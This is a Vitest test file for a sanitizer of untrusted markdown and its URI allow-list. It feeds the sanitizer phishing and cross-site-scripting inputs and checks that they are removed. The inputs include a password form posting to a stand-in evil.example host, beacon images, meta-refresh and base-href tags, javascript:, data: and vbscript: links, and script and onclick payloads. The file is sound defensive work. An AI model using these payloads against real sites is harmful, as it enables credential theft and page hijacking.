import { describe, expect, it } from 'vitest';
import { sanitizeUntrustedMarkdown, UNTRUSTED_ALLOWED_URI_REGEXP } from '../untrusted-markdown';

const render = (md: string) => {
	const div = document.createElement('div');
	div.innerHTML = sanitizeUntrustedMarkdown(md);
	return div;
};

describe('sanitizeUntrustedMarkdown', () => {
	it('keeps ordinary markdown', () => {
		const div = render('# Title\n\nSome **bold** text\n\n- one\n- two\n\n`code`');
		expect(div.querySelector('h1')?.textContent).toBe('Title');
		expect(div.querySelector('strong')?.textContent).toBe('bold');
		expect(div.querySelectorAll('li')).toHaveLength(2);
		expect(div.querySelector('code')?.textContent).toBe('code');
	});

	it('returns an empty string for empty input', () => {
		expect(sanitizeUntrustedMarkdown('')).toBe('');
		expect(sanitizeUntrustedMarkdown(null)).toBe('');
		expect(sanitizeUntrustedMarkdown(undefined)).toBe('');
	});

	it('drops forms and form controls (credential phishing)', () => {
		const div = render(
			'Session expired\n\n<form action="https://evil.example/steal" method="post"><input name="password" type="password"><textarea></textarea><select><option>x</option></select><button formaction="https://evil.example">Log in</button></form>'
		);
		for (const tag of ['form', 'input', 'textarea', 'select', 'option', 'button']) {
			expect(div.querySelector(tag), tag).toBeNull();
		}
		expect(div.innerHTML).not.toContain('evil.example');
	});

	it('drops images, styles, frames, media, svg and document-level tags', () => {
		const div = render(
			'![x](https://evil.example/beacon.png)\n\n<img src="https://evil.example/a.png"><style>body{display:none}</style><iframe src="https://evil.example"></iframe><object data="x"></object><embed src="x"><svg><a href="https://evil.example"></a></svg><math></math><video src="x"></video><audio src="x"></audio><link rel="stylesheet" href="https://evil.example/x.css"><meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/">'
		);
		for (const tag of [
			'img',
			'style',
			'iframe',
			'object',
			'embed',
			'svg',
			'math',
			'video',
			'audio',
			'source',
			'link',
			'meta',
			'base'
		]) {
			expect(div.querySelector(tag), tag).toBeNull();
		}
	});

	it('strips style, id, name, class, srcset and data attributes', () => {
		const div = render(
			'<p style="position:fixed;inset:0" id="x" name="y" class="z" data-mention-id="1">hi</p>'
		);
		const p = div.querySelector('p')!;
		expect(p.textContent).toBe('hi');
		for (const attr of ['style', 'id', 'name', 'class', 'data-mention-id']) {
			expect(p.hasAttribute(attr), attr).toBe(false);
		}
	});

	it('removes hrefs with disallowed schemes or protocol-relative targets', () => {
		for (const href of [
			'javascript:alert(1)',
			'http://evil.example',
			'//evil.example/x',
			'/\\evil.example/x',
			'data:text/html,<script>alert(1)</script>',
			'mailto:a@b.c',
			'vbscript:x'
		]) {
			const div = render(`<a href="${href}">click</a>`);
			const a = div.querySelector('a');
			expect(a?.getAttribute('href') ?? null, href).toBeNull();
		}
	});

	it('keeps internal links without opening a new tab', () => {
		const div = render('[the alert](/alerts/12) and [top](#top)');
		const links = Array.from(div.querySelectorAll('a'));
		expect(links.map((a) => a.getAttribute('href'))).toEqual(['/alerts/12', '#top']);
		for (const a of links) expect(a.hasAttribute('target')).toBe(false);
		expect(div.textContent).not.toContain('(/alerts/12)');
	});

	it('hardens external https links and shows their URL', () => {
		const div = render('[Reset your password](https://evil.example/login)');
		const a = div.querySelector('a')!;
		expect(a.getAttribute('href')).toBe('https://evil.example/login');
		expect(a.getAttribute('target')).toBe('_blank');
		expect(a.getAttribute('rel')).toBe('noopener noreferrer nofollow');
		expect(div.textContent).toContain('Reset your password (https://evil.example/login)');
	});

	it('does not repeat the URL when the text already is the URL', () => {
		const div = render('<a href="https://example.com/x">https://example.com/x</a>');
		expect(div.textContent).toBe('https://example.com/x');
	});

	it('neutralises script and event handlers', () => {
		const div = render('<p onclick="alert(1)">x</p><script>alert(1)</script>');
		expect(div.querySelector('script')).toBeNull();
		expect(div.querySelector('p')?.hasAttribute('onclick')).toBe(false);
	});
});

describe('UNTRUSTED_ALLOWED_URI_REGEXP', () => {
	it('allows only /path, #anchor and https:', () => {
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('/case/1')).toBe(true);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('#x')).toBe(true);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('https://a.b')).toBe(true);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('//a.b')).toBe(false);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('/\\a.b')).toBe(false);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('http://a.b')).toBe(false);
		expect(UNTRUSTED_ALLOWED_URI_REGEXP.test('relative/path')).toBe(false);
	});
});
